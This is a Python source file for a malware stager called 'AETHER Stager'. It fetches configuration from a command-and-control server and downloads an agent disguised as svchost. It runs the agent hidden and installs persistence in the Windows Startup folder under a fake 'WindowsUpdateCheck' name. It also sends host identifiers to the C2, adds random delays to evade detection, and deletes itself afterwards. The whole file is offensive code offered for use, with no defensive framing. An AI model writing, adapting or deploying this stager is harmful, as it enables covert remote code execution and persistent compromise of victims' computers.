#!/usr/bin/env python3
"""
AETHER Stager
Downloads and executes the main agent.
Designed to be small and stealthy.
"""

import os, sys, ctypes, tempfile, hashlib, base64, json, time, random
import urllib.request, ssl, subprocess, zipfile, io

# Disable SSL verification for simplicity
ssl._create_default_https_context = ssl._create_unverified_context

class Stager:
    def __init__(self, config_url=None):
        self.config_url = config_url or "http://your-c2-server.com/config.json"
        self.agent_url = None
        self.agent_hash = None
        self.download_path = None
        
        # Get system info for unique ID
        self.system_id = self.get_system_id()
        
        # Hide console window if compiled
        self.hide_console()
    
    def hide_console(self):
        """Hide console window."""
        try:
            if hasattr(sys, 'frozen'):
                import win32gui, win32con
                win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
        except:
            pass
    
    def get_system_id(self):
        """Generate unique system ID."""
        try:
            import platform, uuid
            
            # Combine various system identifiers
            components = [
                platform.node(),  # Hostname
                str(uuid.getnode()),  # MAC address
                platform.processor(),  # CPU
                platform.version()  # OS version
            ]
            
            combined = ''.join(components)
            return hashlib.sha256(combined.encode()).hexdigest()[:16]
            
        except:
            # Fallback to random ID
            return hashlib.sha256(str(random.getrandbits(256)).encode()).hexdigest()[:16]
    
    def fetch_config(self):
        """Fetch configuration from C2 server."""
        try:
            # Try multiple URLs
            urls = [
                self.config_url,
                self.config_url.replace('http://', 'https://'),
                "http://fallback-c2-server.com/config.json"
            ]
            
            config = None
            for url in urls:
                try:
                    print(f"[*] Trying config URL: {url}")
                    response = urllib.request.urlopen(url, timeout=10)
                    config_data = response.read().decode()
                    config = json.loads(config_data)
                    
                    self.agent_url = config.get('agent_url')
                    self.agent_hash = config.get('agent_hash')
                    
                    print(f"[+] Config fetched from {url}")
                    break
                    
                except Exception as e:
                    print(f"[-] Failed {url}: {e}")
                    continue
            
            if not config:
                # Use hardcoded fallback
                print("[*] Using hardcoded fallback config")
                config = {
                    'agent_url': 'http://your-c2-server.com/agent.exe',
                    'agent_hash': 'sha256:abc123...',
                    'beacon_interval': 30,
                    'c2_server': 'your-c2-server.com',
                    'c2_port': 443
                }
                
                self.agent_url = config['agent_url']
                self.agent_hash = config['agent_hash']
            
            return config
            
        except Exception as e:
            print(f"[-] Config fetch failed: {e}")
            return None
    
    def download_agent(self):
        """Download the main agent."""
        if not self.agent_url:
            print("[-] No agent URL configured")
            return None
        
        try:
            # Create temp directory
            temp_dir = tempfile.gettempdir()
            agent_filename = f"svchost_{random.randint(1000, 9999)}.exe"
            self.download_path = os.path.join(temp_dir, agent_filename)
            
            print(f"[*] Downloading agent from {self.agent_url}")
            
            # Download with retries
            for attempt in range(3):
                try:
                    response = urllib.request.urlopen(self.agent_url, timeout=30)
                    agent_data = response.read()
                    
                    # Verify hash if provided
                    if self.agent_hash and ':' in self.agent_hash:
                        algo, expected_hash = self.agent_hash.split(':', 1)
                        
                        if algo == 'sha256':
                            actual_hash = hashlib.sha256(agent_data).hexdigest()
                            if actual_hash != expected_hash:
                                print(f"[-] Hash mismatch on attempt {attempt + 1}")
                                if attempt < 2:
                                    time.sleep(2)
                                    continue
                                else:
                                    print("[-] Hash verification failed after retries")
                                    return None
                    
                    # Save to file
                    with open(self.download_path, 'wb') as f:
                        f.write(agent_data)
                    
                    print(f"[+] Agent downloaded to {self.download_path}")
                    return self.download_path
                    
                except Exception as e:
                    print(f"[-] Download attempt {attempt + 1} failed: {e}")
                    if attempt < 2:
                        time.sleep(3)
                    else:
                        return None
            
            return None
            
        except Exception as e:
            print(f"[-] Download failed: {e}")
            return None
    
    def execute_agent(self, agent_path):
        """Execute the downloaded agent."""
        try:
            print(f"[*] Executing agent: {agent_path}")
            
            # Hide the executable
            try:
                import win32file, win32con
                win32file.SetFileAttributes(agent_path, win32con.FILE_ATTRIBUTE_HIDDEN)
            except:
                pass
            
            # Execute
            if agent_path.endswith('.exe'):
                # Windows executable
                CREATE_NO_WINDOW = 0x08000000
                subprocess.Popen([agent_path], 
                                creationflags=CREATE_NO_WINDOW,
                                close_fds=True)
            elif agent_path.endswith('.py'):
                # Python script
                subprocess.Popen([sys.executable, agent_path],
                                creationflags=CREATE_NO_WINDOW,
                                close_fds=True)
            else:
                # Unknown format, try to execute anyway
                os.startfile(agent_path)
            
            print("[+] Agent execution initiated")
            return True
            
        except Exception as e:
            print(f"[-] Execution failed: {e}")
            return False
    
    def setup_persistence(self):
        """Set up persistence for the stager itself."""
        try:
            current_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
            
            # Copy to startup folder
            startup_path = os.path.join(
                os.environ['APPDATA'],
                'Microsoft', 'Windows', 'Start Menu',
                'Programs', 'Startup'
            )
            
            os.makedirs(startup_path, exist_ok=True)
            stager_copy = os.path.join(startup_path, 'WindowsUpdateCheck.exe')
            
            # Copy if not already there
            if not os.path.exists(stager_copy):
                import shutil
                shutil.copy2(current_path, stager_copy)
                
                # Hide it
                try:
                    import win32file, win32con
                    win32file.SetFileAttributes(stager_copy, win32con.FILE_ATTRIBUTE_HIDDEN)
                except:
                    pass
                
                print(f"[+] Persistence installed: {stager_copy}")
                return stager_copy
            
            return current_path
            
        except Exception as e:
            print(f"[-] Persistence setup failed: {e}")
            return None
    
    def beacon_to_c2(self, config):
        """Send initial beacon to C2."""
        try:
            beacon_data = {
                'id': self.system_id,
                'type': 'stager',
                'status': 'agent_delivered',
                'timestamp': time.time(),
                'os': os.name,
                'arch': platform.architecture()[0] if 'platform' in sys.modules else 'unknown'
            }
            
            c2_server = config.get('c2_server', 'your-c2-server.com')
            c2_port = config.get('c2_port', 443)
            
            url = f"https://{c2_server}:{c2_port}/beacon"
            
            # Send beacon
            req = urllib.request.Request(url)
            req.add_header('Content-Type', 'application/json')
            beacon_json = json.dumps(beacon_data).encode()
            
            response = urllib.request.urlopen(req, beacon_json, timeout=10)
            print(f"[+] Beacon sent to C2: {response.getcode()}")
            
            return True
            
        except Exception as e:
            print(f"[-] Beacon failed: {e}")
            return False
    
    def run(self):
        """Main stager execution flow."""
        print("[*] AETHER Stager starting...")
        
        # Fetch configuration
        config = self.fetch_config()
        if not config:
            print("[-] Failed to get configuration")
            return False
        
        # Download agent
        agent_path = self.download_agent()
        if not agent_path:
            print("[-] Failed to download agent")
            return False
        
        # Execute agent
        if not self.execute_agent(agent_path):
            print("[-] Failed to execute agent")
            return False
        
        # Set up persistence
        persistent_path = self.setup_persistence()
        if persistent_path:
            print(f"[+] Stager persisted: {persistent_path}")
        
        # Send beacon
        self.beacon_to_c2(config)
        
        print("[+] Stager completed successfully")
        
        # Self-destruct if not persisted
        if not persistent_path or persistent_path != (sys.executable if hasattr(sys, 'frozen') else sys.argv[0]):
            self.self_destruct()
        
        return True
    
    def self_destruct(self):
        """Remove stager after execution."""
        try:
            current_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
            
            # Create batch file to delete ourselves
            batch_content = f'''
            @echo off
            timeout /t 3 /nobreak >nul
            del "{current_path}"
            del "%~f0"
            '''
            
            batch_path = os.path.join(tempfile.gettempdir(), 'cleanup.bat')
            with open(batch_path, 'w') as f:
                f.write(batch_content)
            
            # Execute batch file
            subprocess.Popen(['cmd.exe', '/C', batch_path],
                            creationflags=0x08000000)  # CREATE_NO_WINDOW
            
            print("[*] Stager self-destruct initiated")
            
        except Exception as e:
            print(f"[-] Self-destruct failed: {e}")

def main():
    """Entry point."""
    # Add some random delay to avoid pattern detection
    time.sleep(random.uniform(0, 5))
    
    # Create and run stager
    stager = Stager()
    
    # Try to run, with fallback
    try:
        success = stager.run()
        if not success:
            print("[-] Stager failed, exiting")
    except Exception as e:
        print(f"[-] Stager crashed: {e}")
    
    # Exit
    sys.exit(0)

if __name__ == "__main__":
    main()